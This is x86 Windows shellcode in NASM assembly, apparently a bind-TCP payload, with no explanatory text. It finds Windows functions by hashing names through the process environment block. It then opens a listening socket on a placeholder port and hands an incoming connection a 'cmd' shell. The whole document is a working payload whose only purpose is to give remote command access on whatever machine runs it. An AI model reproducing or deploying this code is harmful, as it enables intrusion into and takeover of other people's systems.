BITS 32
  cld
  call start
api_call:
  pushad
  mov ebp, esp
  xor edx, edx
  mov edx, [fs:edx+48]
  mov edx, [edx+12]
  mov edx, [edx+20]
next_mod:
  mov esi, [edx+40]
  movzx ecx, word [edx+38]
  xor edi, edi
loop_modname:
  xor eax, eax
  lodsb
  cmp al, 'a'
  jl not_lowercase
  sub al, 0x20
not_lowercase:
  ror edi, 13
  add edi, eax
  loop loop_modname
  push edx
  push edi
  mov edx, [edx+16]
  mov eax, [edx+60]
  add eax, edx
  mov eax, [eax+120]
  test eax, eax
  jz get_next_mod1
  add eax, edx
  push eax
  mov ecx, [eax+24]
  mov ebx, [eax+32]
  add ebx, edx
get_next_func:
  jecxz get_next_mod
  dec ecx
  mov esi, [ebx+ecx*4]
  add esi, edx
  xor edi, edi
loop_funcname:
  xor eax, eax
  lodsb
  ror edi, 13
  add edi, eax
  cmp al, ah
  jne loop_funcname
  add edi, [ebp-8]
  cmp edi, [ebp+36]
  jnz get_next_func
  pop eax
  mov ebx, [eax+36]
  add ebx, edx
  mov cx, [ebx+2*ecx]
  mov ebx, [eax+28]
  add ebx, edx
  mov eax, [ebx+4*ecx]
  add eax, edx
finish:
  mov [esp+36], eax
  pop ebx
  pop ebx
  popad
  pop ecx
  pop edx
  push ecx
  jmp eax
get_next_mod:
  pop eax
get_next_mod1:
  pop edi
  pop edx
  mov edx, [edx]
  jmp short next_mod
start:
  pop ebp
bind_tcp:
  push 0x00003233
  push 0x5F327377
  push esp
  push 0x0726774C
  call ebp
  mov eax, 0x0190
  sub esp, eax
  push esp
  push eax
  push 0x006B8029
  call ebp
  push eax
  push eax
  push eax
  push eax
  inc eax
  push eax
  inc eax
  push eax
  push 0xE0DF0FEA
  call ebp
  xchg edi, eax
  xor ebx, ebx
  push ebx
  push 0xBIND_PORT0002 ;port
  mov esi, esp
  push byte 16
  push esi
  push edi
  push 0x6737DBC2
  call ebp
  push ebx
  push edi
  push 0xFF38E9B7
  call ebp
  push ebx
  push ebx
  push edi
  push 0xE13BEC74
  call ebp
  push edi
  xchg edi, eax
  push 0x614D6E75
  call ebp
shell:
  push 0x00646D63
  mov ebx, esp
  push edi
  push edi
  push edi
  xor esi, esi
  push byte 18
  pop ecx
push_loop:
  push esi
  loop push_loop
  mov word [esp + 60], 0x0101
  lea eax, [esp + 16]
  mov byte [eax], 68
  push esp
  push eax
  push esi
  push esi
  push esi
  inc esi
  push esi
  dec esi
  push esi
  push esi
  push ebx
  push esi
  push 0x863FCC79
  call ebp
  mov eax, esp
  dec esi
  push esi
  inc esi
  push dword [eax]
  push 0x601D8708
  call ebp
exitfunk:
  mov ebx, 0x0A2A1DE0
  push 0x9DBD95A6
  call ebp
  cmp al, byte 6
  jl short goodbye
  cmp bl, 0xE0
  jne short goodbye
  mov ebx, 0x6F721347
goodbye:
  push byte 0
  push ebx
  call ebp